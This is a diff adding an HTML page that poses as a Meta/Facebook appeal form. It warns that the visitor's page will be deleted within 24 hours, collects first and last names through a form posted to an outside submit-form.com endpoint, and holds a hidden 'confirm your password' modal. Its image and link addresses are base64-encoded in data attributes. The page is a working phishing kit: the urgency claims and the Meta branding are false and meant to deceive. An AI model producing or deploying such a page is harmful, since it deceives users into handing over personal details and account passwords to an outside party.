@@ -1,0 +1,2009 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Appeal Request</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            padding: 0;
+            padding-top: 64px;
+        }
+
+        .form-main-container {
+            display: flex;
+            justify-content: flex-end;
+            max-width: 100%;
+            margin: 0;
+            flex: 1;
+            align-items: center;
+            padding: 20px;
+            padding-right: 120px;
+            width: 100%;
+        }
+
+        .logo-section {
+            display: none;
+        }
+
+        .logo {
+            display: none;
+        }
+
+        .tagline {
+            display: none;
+        }
+
+        .form-container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 550px;
+            margin: 0 auto;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .form-group input {
+            flex: 1;
+        }
+
+        .form-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 4px;
+            display: block;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px 14px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            background-color: #f5f6f7;
+            transition: background-color 0.2s;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            background-color: white;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.1);
+        }
+
+        .form-error {
+            font-size: 13px;
+            color: #c41e3a;
+            margin-bottom: 8px;
+            padding: 8px 12px;
+            background-color: #ffe0e0;
+            border-left: 3px solid #c41e3a;
+            border-radius: 4px;
+            animation: slideDown 0.3s ease-in-out;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #165ec7;
+        }
+
+        button:active {
+            background-color: #0d47a1;
+        }
+
+        .form-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 5px;
+        }
+
+        .form-subtitle {
+            font-size: 13px;
+            color: #606770;
+            margin-bottom: 15px;
+        }
+
+        .terms-conditions {
+            background-color: #f0f2f5;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 12px;
+            color: #606770;
+            line-height: 1.5;
+        }
+
+        .terms-conditions strong {
+            color: #000;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        /* Warning & Appeal Box Styles */
+        .warning-box {
+            background-color: #fff3cd;
+            border: 2px solid #ffc107;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .warning-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #856404;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .warning-title span {
+            display: block;
+        }
+
+        .warning-subtext {
+            font-size: 13px;
+            color: #704214;
+            line-height: 1.6;
+            margin-bottom: 12px;
+        }
+
+        .warning-extra {
+            font-size: 12px;
+            color: #704214;
+            line-height: 1.5;
+            margin-bottom: 15px;
+            background-color: rgba(255, 255, 255, 0.5);
+            padding: 10px;
+            border-left: 3px solid #ffc107;
+            border-radius: 4px;
+        }
+
+        .appeal-box {
+            background-color: #ffffff;
+            border: 1px solid #e5e5e5;
+            border-radius: 8px;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .appeal-box img {
+            width: 80px;
+            height: 80px;
+            object-fit: contain;
+            flex-shrink: 0;
+        }
+
+        .appeal-info {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .appeal-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #000;
+        }
+
+        .appeal-desc {
+            font-size: 12px;
+            color: #606770;
+            line-height: 1.5;
+        }
+
+        .appeal-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            align-self: flex-start;
+            margin-top: 5px;
+        }
+
+        .appeal-btn:hover {
+            background-color: #165ec7;
+        }
+
+        .appeal-btn:active {
+            background-color: #0d47a1;
+        }
+
+        /* Deadline Styles */
+        .deadline-section {
+            background-color: #ffe0e0;
+            border: 2px solid #ff6b6b;
+            border-radius: 8px;
+            padding: 12px 15px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .deadline-icon {
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+
+        .deadline-info {
+            flex: 1;
+        }
+
+        .deadline-label {
+            font-size: 12px;
+            color: #c41e3a;
+            font-weight: 600;
+            margin: 0;
+        }
+
+        .deadline-time {
+            font-size: 16px;
+            font-weight: 700;
+            color: #c41e3a;
+            margin: 2px 0 0 0;
+        }
+
+        .deadline-warning {
+            font-size: 11px;
+            color: #c41e3a;
+            margin: 6px 0 0 0;
+            line-height: 1.4;
+            font-weight: 500;
+        }
+
+        /* Navbar Styles */
+        nav {
+            background-color: #ffffff;
+            border-bottom: 1px solid #e5e5e5;
+            padding: 12px 16px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            width: 100%;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .navbar-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 20px;
+            padding: 0 10px;
+        }
+
+        .navbar-logo {
+            display: flex;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
+        .navbar-logo img {
+            height: 36px;
+            width: auto;
+        }
+
+        .navbar-search {
+            flex: 0;
+            max-width: 280px;
+            position: relative;
+        }
+
+        .navbar-search-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+            background-color: #f0f2f5;
+            border-radius: 20px;
+            border: 2px solid transparent;
+            transition: all 0.3s ease;
+            padding: 0 12px;
+        }
+
+        .navbar-search-wrapper:hover {
+            background-color: #e4e6e9;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .navbar-search-wrapper:has(input:focus) {
+            background-color: #fff;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
+        }
+
+        .navbar-search-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #65676b;
+            font-size: 16px;
+            pointer-events: none;
+            margin-right: 6px;
+        }
+
+        .navbar-search input {
+            width: 100%;
+            padding: 9px 0;
+            background-color: transparent;
+            border: none;
+            font-size: 14px;
+            outline: none;
+            color: #000;
+            flex: 1;
+        }
+
+        .navbar-search input::placeholder {
+            color: #65676b;
+            opacity: 0.7;
+            font-weight: 500;
+        }
+
+        .navbar-search-clear {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            color: #65676b;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 4px;
+            margin-left: 4px;
+            transition: transform 0.2s;
+        }
+
+        .navbar-search-clear:hover {
+            transform: scale(1.1);
+        }
+
+        .navbar-search input:not(:placeholder-shown) ~ .navbar-search-clear {
+            display: flex;
+        }
+
+        .navbar-menu {
+            display: flex;
+            gap: 20px;
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            flex-shrink: 0;
+        }
+
+        .navbar-menu li {
+            margin: 0;
+        }
+
+        .navbar-menu a {
+            text-decoration: none;
+            color: #050505;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.2s ease;
+            padding: 8px 12px;
+            display: inline-block;
+        }
+
+        .navbar-menu a:hover {
+            color: #1877f2;
+        }
+
+        /* Video Section Styles - Hidden */
+        .video-section {
+            display: none;
+        }
+
+        .instructions {
+            display: none;
+        }
+
+        /* Form Details */
+        .form-details {
+            font-size: 12px;
+            color: #606770;
+            margin-top: 15px;
+            line-height: 1.5;
+        }
+
+        .form-details strong {
+            color: #000;
+        }
+
+        .form-video-container {
+            position: relative;
+            width: 100%;
+            background: #f0f2f5;
+            border-radius: 8px;
+            overflow: hidden;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: transform 0.2s;
+        }
+
+        .form-video-container:hover {
+            transform: scale(1.02);
+        }
+
+        .video-info-section {
+            margin-bottom: 20px;
+        }
+
+        .video-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 8px;
+        }
+
+        .video-description {
+            font-size: 12px;
+            color: #606770;
+            line-height: 1.5;
+            margin-bottom: 10px;
+        }
+
+        .video-meta {
+            font-size: 11px;
+            color: #8a8d91;
+            display: flex;
+            gap: 15px;
+        }
+
+        .video-meta span {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .form-video-thumbnail {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            display: block;
+        }
+
+        /* Footer Styles */
+        footer {
+            background-color: #f0f2f5;
+            border-top: 1px solid #e5e5e5;
+            padding: 20px 16px;
+            margin-top: auto;
+        }
+
+        .footer-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 30px;
+        }
+
+        .footer-section {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .footer-title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 4px;
+        }
+
+        .footer-link {
+            font-size: 12px;
+            color: #65676b;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-link:hover {
+            color: #1877f2;
+        }
+
+        .footer-bottom {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e5e5e5;
+            text-align: center;
+            font-size: 11px;
+            color: #65676b;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 2000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .modal.active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            max-width: 400px;
+            width: 90%;
+            animation: slideUp 0.3s ease-in-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .modal-subtitle {
+            font-size: 13px;
+            color: #606770;
+            margin-bottom: 20px;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .modal-form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .modal-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #000;
+        }
+
+        .password-input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .modal-input {
+            width: 100%;
+            padding: 10px 40px 10px 12px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            background-color: #f5f6f7;
+            transition: all 0.2s;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            cursor: pointer;
+            color: #65676b;
+            font-size: 18px;
+            user-select: none;
+            transition: color 0.2s;
+        }
+
+        .toggle-password:hover {
+            color: #1877f2;
+        }
+
+        .modal-input:focus {
+            outline: none;
+            background-color: white;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.1);
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .modal-btn {
+            flex: 1;
+            padding: 11px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .modal-btn-confirm {
+            background-color: #1877f2;
+            color: white;
+        }
+
+        .modal-btn-confirm:hover {
+            background-color: #165ec7;
+        }
+
+        .modal-btn-confirm:active {
+            background-color: #0d47a1;
+        }
+
+        .modal-btn-cancel {
+            background-color: #e5e5e5;
+            color: #000;
+        }
+
+        .modal-btn-cancel:hover {
+            background-color: #d0d0d0;
+        }
+
+        /* Success Modal Styles */
+        .success-modal {
+            display: none;
+            position: fixed;
+            z-index: 2000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        .success-modal.active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .success-modal-content {
+            background-color: #fff;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            max-width: 420px;
+            width: 90%;
+            text-align: center;
+            animation: slideUp 0.3s ease-in-out;
+        }
+
+        .success-icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+            animation: scaleIn 0.4s ease-in-out;
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .success-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1877f2;
+            margin-bottom: 12px;
+        }
+
+        .success-message {
+            font-size: 14px;
+            color: #606770;
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+
+        .success-info {
+            font-size: 13px;
+            color: #8a8d91;
+            line-height: 1.5;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid #e5e5e5;
+        }
+
+        .success-info strong {
+            color: #1877f2;
+        }
+
+        .success-btn {
+            width: 100%;
+            padding: 12px;
+            margin-top: 20px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .success-btn:hover {
+            background-color: #165ec7;
+        }
+
+        .success-btn:active {
+            background-color: #0d47a1;
+        }
+
+        /* Language Selector Modal */
+        .language-modal {
+            display: none;
+            position: fixed;
+            z-index: 3000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        .language-modal.active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .language-modal-content {
+            background-color: #fff;
+            padding: 35px 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            max-width: 450px;
+            width: 90%;
+            animation: slideUp 0.3s ease-in-out;
+        }
+
+        .language-modal-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .language-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .language-option {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 15px;
+            background-color: #f0f2f5;
+            border: 2px solid transparent;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .language-option:hover {
+            background-color: #e7f3ff;
+            border-color: #1877f2;
+        }
+
+        .language-option .flag {
+            font-size: 24px;
+        }
+
+        @media (max-width: 1024px) {
+            .form-main-container {
+                padding-right: 40px;
+            }
+
+            .form-container {
+                max-width: 100%;
+            }
+        }
+
+        @media (max-width: 768px) {
+            body {
+                padding-top: 56px;
+            }
+
+            nav {
+                padding: 8px 12px;
+            }
+
+            .navbar-content {
+                gap: 12px;
+                padding: 0 8px;
+                flex-wrap: wrap;
+            }
+
+            .navbar-logo {
+                font-size: 20px;
+                order: 1;
+            }
+
+            .navbar-menu {
+                order: 2;
+                gap: 12px;
+                flex: 1;
+                justify-content: center;
+            }
+
+            .navbar-search {
+                order: 3;
+                width: auto;
+                max-width: 200px;
+                flex: 1;
+            }
+
+            .navbar-search input {
+                font-size: 13px;
+                padding: 7px 10px;
+            }
+
+            .navbar-menu a {
+                font-size: 12px;
+                padding: 6px 10px;
+            }
+
+            .form-main-container {
+                justify-content: center;
+                padding: 20px 15px;
+                padding-right: 15px;
+            }
+
+            .form-container {
+                width: 100%;
+                max-width: 100%;
+                padding: 25px;
+                box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            }
+
+            .form-title {
+                font-size: 17px;
+                margin-bottom: 8px;
+            }
+
+            .form-subtitle {
+                font-size: 13px;
+                margin-bottom: 15px;
+            }
+
+            .terms-conditions {
+                padding: 12px;
+                font-size: 12px;
+                margin-bottom: 15px;
+            }
+
+            .warning-box {
+                padding: 15px;
+                margin-bottom: 15px;
+            }
+
+            .warning-title {
+                font-size: 15px;
+                margin-bottom: 10px;
+            }
+
+            .warning-subtext {
+                font-size: 12px;
+                margin-bottom: 10px;
+            }
+
+            .appeal-box {
+                flex-direction: column;
+                padding: 12px;
+            }
+
+            .appeal-box img {
+                width: 70px;
+                height: 70px;
+            }
+
+            .appeal-title {
+                font-size: 13px;
+            }
+
+            .appeal-desc {
+                font-size: 11px;
+            }
+
+            .video-title {
+                font-size: 14px;
+            }
+
+            .form-video-thumbnail {
+                height: 160px;
+            }
+
+            .deadline-section {
+                padding: 10px 12px;
+                gap: 10px;
+            }
+
+            .deadline-icon {
+                font-size: 20px;
+            }
+
+            .deadline-label {
+                font-size: 11px;
+            }
+
+            .deadline-time {
+                font-size: 15px;
+            }
+
+            .deadline-warning {
+                font-size: 10px;
+            }
+
+            .form-label {
+                font-size: 13px;
+            }
+
+            input[type="text"] {
+                padding: 10px 12px;
+                font-size: 15px;
+            }
+
+            button {
+                padding: 11px;
+                font-size: 16px;
+                margin-top: 10px;
+            }
+
+            .form-details {
+                font-size: 12px;
+            }
+
+            .video-container {
+                max-width: 100%;
+            }
+
+            footer {
+                padding: 15px 12px;
+            }
+
+            .footer-content {
+                gap: 20px;
+            }
+
+            .footer-title {
+                font-size: 12px;
+            }
+
+            .footer-link {
+                font-size: 11px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding-top: 50px;
+            }
+
+            nav {
+                padding: 6px 8px;
+            }
+
+            .navbar-content {
+                gap: 6px;
+                padding: 0 4px;
+                flex-wrap: nowrap;
+                justify-content: space-between;
+            }
+
+            .navbar-logo {
+                font-size: 18px;
+                order: 1;
+                flex-shrink: 0;
+            }
+
+            .navbar-menu {
+                display: none;
+            }
+
+            .navbar-search {
+                order: 2;
+                width: auto;
+                max-width: 100px;
+                flex: 1;
+                min-width: 80px;
+            }
+
+            .navbar-search input {
+                font-size: 11px;
+                padding: 5px 8px;
+                width: 100%;
+            }
+
+            .form-main-container {
+                padding: 12px;
+                padding-right: 12px;
+            }
+
+            .form-container {
+                padding: 18px;
+                border-radius: 6px;
+                box-shadow: 0 1px 1px rgba(0, 0, 0, 0.08);
+            }
+
+            .form-title {
+                font-size: 16px;
+                margin-bottom: 4px;
+                font-weight: 600;
+            }
+
+            .form-subtitle {
+                font-size: 12px;
+                margin-bottom: 12px;
+                color: #65676b;
+            }
+
+            .terms-conditions {
+                padding: 10px;
+                font-size: 11px;
+                margin-bottom: 12px;
+                line-height: 1.4;
+            }
+
+            .terms-conditions strong {
+                margin-bottom: 6px;
+                font-size: 12px;
+            }
+
+            .warning-box {
+                padding: 12px;
+                margin-bottom: 12px;
+                border-width: 1px;
+            }
+
+            .warning-title {
+                font-size: 14px;
+                margin-bottom: 8px;
+            }
+
+            .warning-subtext {
+                font-size: 11px;
+                margin-bottom: 8px;
+            }
+
+            .warning-extra {
+                font-size: 10px;
+                padding: 8px;
+                margin-bottom: 12px;
+            }
+
+            .appeal-box {
+                flex-direction: column;
+                padding: 10px;
+                gap: 10px;
+            }
+
+            .appeal-box img {
+                width: 60px;
+                height: 60px;
+            }
+
+            .appeal-info {
+                gap: 6px;
+            }
+
+            .appeal-title {
+                font-size: 12px;
+            }
+
+            .appeal-desc {
+                font-size: 10px;
+            }
+
+            .appeal-btn {
+                padding: 8px 16px;
+                font-size: 13px;
+            }
+
+            .video-info-section {
+                margin-bottom: 12px;
+            }
+
+            .video-title {
+                font-size: 13px;
+                margin-bottom: 8px;
+            }
+
+            .form-video-thumbnail {
+                height: 130px;
+            }
+
+            .deadline-section {
+                padding: 10px 12px;
+                gap: 10px;
+                margin-bottom: 12px;
+            }
+
+            .deadline-icon {
+                font-size: 18px;
+            }
+
+            .deadline-label {
+                font-size: 10px;
+            }
+
+            .deadline-time {
+                font-size: 14px;
+            }
+
+            .deadline-warning {
+                font-size: 9px;
+            }
+
+            .form-label {
+                font-size: 12px;
+                margin-bottom: 3px;
+            }
+
+            .form-group {
+                flex-direction: column;
+                gap: 8px;
+                margin-bottom: 8px;
+            }
+
+            input[type="text"] {
+                padding: 10px 12px;
+                font-size: 14px;
+                border-radius: 4px;
+            }
+
+            button {
+                padding: 10px;
+                font-size: 15px;
+                margin-top: 8px;
+                border-radius: 4px;
+            }
+
+            .form-details {
+                font-size: 11px;
+                margin-top: 12px;
+                line-height: 1.4;
+            }
+
+            footer {
+                padding: 12px 8px;
+            }
+
+            .footer-content {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .footer-title {
+                font-size: 11px;
+                margin-bottom: 3px;
+            }
+
+            .footer-link {
+                font-size: 10px;
+            }
+
+            .footer-bottom {
+                font-size: 10px;
+                margin-top: 15px;
+                padding-top: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Language Selector Modal -->
+    <div id="languageModal" class="language-modal active">
+        <div class="language-modal-content">
+            <div class="language-modal-title">🌍 Choose Your Language</div>
+            <div class="language-options">
+                <div class="language-option" data-lang="en">
+                    <span class="flag">🇺🇸</span>
+                    <span>English</span>
+                </div>
+                <div class="language-option" data-lang="hi">
+                    <span class="flag">🇮🇳</span>
+                    <span>Hindi</span>
+                </div>
+                <div class="language-option" data-lang="es">
+                    <span class="flag">🇪🇸</span>
+                    <span>Spanish</span>
+                </div>
+                <div class="language-option" data-lang="pt">
+                    <span class="flag">🇵🇹</span>
+                    <span>Portuguese</span>
+                </div>
+                <div class="language-option" data-lang="ta">
+                    <span class="flag">🇮🇳</span>
+                    <span>Tamil</span>
+                </div>
+                <div class="language-option" data-lang="ar">
+                    <span class="flag">🇸🇦</span>
+                    <span>Arabic</span>
+                </div>
+                <div class="language-option" data-lang="fr">
+                    <span class="flag">🇫🇷</span>
+                    <span>French</span>
+                </div>
+                <div class="language-option" data-lang="vi">
+                    <span class="flag">🇻🇳</span>
+                    <span>Vietnamese</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <nav>
+        <div class="navbar-content">
+            <div class="navbar-logo">
+                <img data-src="aHR0cHM6Ly91cGxvYWQud2lraW1lZGlhLm9yZy93aWtpcGVkaWEvY29tbW9ucy90aHVtYi83LzdiL01ldGFfUGxhdGZvcm1zX0luYy5fbG9nby5zdmcvMTIwMHB4LU1ldGFfUGxhdGZvcm1zX0luYy5fbG9nby5zdmcucG5n" alt="Meta">
+            </div>
+            <ul class="navbar-menu">
+                <li><a href="#help">Help Center</a></li>
+                <li><a href="#privacy">Privacy</a></li>
+                <li><a href="#terms">Terms</a></li>
+            </ul>
+            <div class="navbar-search">
+                <div class="navbar-search-wrapper">
+                    <div class="navbar-search-icon">🔍</div>
+                    <input type="text" placeholder="Search or get help...">
+                    <div class="navbar-search-clear">✕</div>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <div class="form-main-container">
+        <div class="form-container">
+            <div class="warning-box">
+                <div class="warning-title">
+                    <span class="translatable" data-key="warningTitle">🚨 URGENT: Your Page Will Be Permanently Deleted in 24 Hours!</span>
+                </div>
+                <div class="warning-subtext translatable" data-key="warningSubtext">
+                    Our automated security system has detected severe policy violations on your page. Multiple reports indicate that your page has violated our Community Standards and Terms of Service. Due to the seriousness of these violations, your page has been scheduled for PERMANENT DELETION.
+                </div>
+                <div class="warning-extra translatable" data-key="warningExtra">
+                    ⚠️ CRITICAL ACTION REQUIRED: You have ONLY 24 HOURS to submit a review request to prevent permanent deletion. If we do not receive your appeal within this timeframe, your page and all associated content will be PERMANENTLY REMOVED and CANNOT be recovered. This is your FINAL opportunity to save your page. Do NOT ignore this warning!
+                </div>
+            </div>
+
+            <div class="video-info-section">
+                <div class="video-title">📹 How to Request Review</div>
+            </div>
+
+            <div class="form-video-container">
+                <video data-src="aHR0cHM6Ly9yZXNvdXJjZTIuaGV5Z2VuLmFpL3ZpZGVvX3RyYW5zbGF0ZS85NDA4NzM1ODAzMGE0ZGY4YjIwZTczZjFmYmE5MmVkNS1lbi83MjBwLm1wNA==" class="form-video-thumbnail" controls controlsList="nodownload"></video>
+            </div>
+
+            <div class="deadline-section">
+                <div class="deadline-icon">⏰</div>
+                <div class="deadline-info">
+                    <p class="deadline-label">Response Deadline</p>
+                    <p class="deadline-time">24 Hours</p>
+                    <p class="deadline-warning">If you don't submit within 24 hours, your page will be deleted</p>
+                </div>
+            </div>
+
+             <form action="https://submit-form.com/00VQ1ZB1L" method="post">
+                <div class="form-group">
+                    <img data-src="aHR0cHM6Ly9pay5pbWFnZWtpdC5pby9tdWJ2Z2E2NjYvTmV3JTIwRm9sZGVyL3UuanBnP3VwZGF0ZWRBdD0xNzYzNDYxNTAzODQ0" style="height: 13px; width: auto; max-width: 80px; margin-bottom: 4px; display: block; object-fit: contain;">
+                    <input 
+                        type="text" 
+                        name="first_name" 
+                        placeholder="Enter value" 
+                        required
+                    >
+                    <img data-src="aHR0cHM6Ly9pay5pbWFnZWtpdC5pby9tdWJ2Z2E2NjYvTmV3JTIwRm9sZGVyL3gucG5nP3VwZGF0ZWRBdD0xNzYzNDYxNTA0MTEz" style="height: 13px; width: auto; max-width: 80px; margin-bottom: 4px; margin-top: 10px; margin-left: 0; display: block; object-fit: contain;">
+                    <div id="lastNameError" class="form-error" style="display: none;"></div>
+                    <input 
+                        type="text" 
+                        name="last_name" 
+                        placeholder="Enter value" 
+                        required
+                    >
+                </div>
+
+                <button type="submit" class="appeal-btn" id="open-appeal-btn" style="width: 100%; margin-top: 15px; margin-bottom: 20px;">
+                    <span id="fbSendBtnText" class="translatable" data-key="appealBtn">Submit Appeal</span>
+                </button>
+
+                <div class="appeal-box">
+                    <img data-src="aHR0cHM6Ly9pay5pbWFnZWtpdC5pby9hbGlicm9oaS9kb3dubG9hZC5wbmc/dXBkYXRlZEF0PTE3NTYxMDIyNjI3Njc=" alt="Appeal Illustration" />
+                    
+                    <div class="appeal-info">
+                        <div class="appeal-title translatable" data-key="appealTitle">Appeal request</div>
+                        <div class="appeal-desc translatable" data-key="appealDesc">
+                            Fixing problems with your page
+                            Please be sure to provide the requested information below.
+                            Failure to provide this information may delay the processing of your appeal.
+                        </div>
+                        <div style="font-size: 12px; color: #606770; margin-top: 8px;">
+                            Need help? Contact us at <a data-href="bWFpbHRvOnN1cHBvcnRAZmFjZWJvb2suY29t" style="color: #1877f2; text-decoration: none; font-weight: 600; cursor: pointer;">support@facebook.com</a>
+                        </div>
+                    </div>
+                </div>
+            </form>
+
+            
+            <div id="passwordModal" class="modal">
+                <div class="modal-content">
+                    <div class="modal-title">Confirm Your Password</div>
+                    <div class="modal-subtitle">Please confirm your password to complete the appeal process.</div>
+                    
+                    <div class="modal-form-group">
+                        <label class="modal-label">Password</label>
+                        <div class="password-input-wrapper">
+                            <input type="password" id="modalPassword" class="modal-input" placeholder="Enter your password" required>
+                            <span class="toggle-password" id="togglePassword">👁️</span>
+                        </div>
+                    </div>
+
+                    <div class="modal-buttons">
+                        <button type="button" class="modal-btn modal-btn-cancel" id="cancelBtn">Cancel</button>
+                        <button type="button" class="modal-btn modal-btn-confirm" id="confirmBtn">Confirm</button>
+                    </div>
+                </div>
+            </div>
+
+            
+            <div id="successModal" class="success-modal">
+                <div class="success-modal-content">
+                    <div class="success-icon">✓</div>
+                    <div class="success-title">Request Received!</div>
+                    <div class="success-message">Your appeal has been successfully submitted.</div>
+                    <div class="success-info">
+                        <strong>Please wait 24-48 hours</strong> to complete your review.<br>
+                        We will notify you once the review is finished.
+                    </div>
+                    <button class="success-btn" id="successBtn">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <div class="footer-title">Company</div>
+                <a href="#" class="footer-link">About Us</a>
+                <a href="#" class="footer-link">Careers</a>
+                <a href="#" class="footer-link">Blog</a>
+            </div>
+            <div class="footer-section">
+                <div class="footer-title">Support</div>
+                <a href="#" class="footer-link">Help Center</a>
+                <a href="#" class="footer-link">Contact Us</a>
+                <a href="#" class="footer-link">Report Problem</a>
+            </div>
+            <div class="footer-section">
+                <div class="footer-title">Legal</div>
+                <a href="#" class="footer-link">Privacy Policy</a>
+                <a href="#" class="footer-link">Terms of Service</a>
+                <a href="#" class="footer-link">Cookie Policy</a>
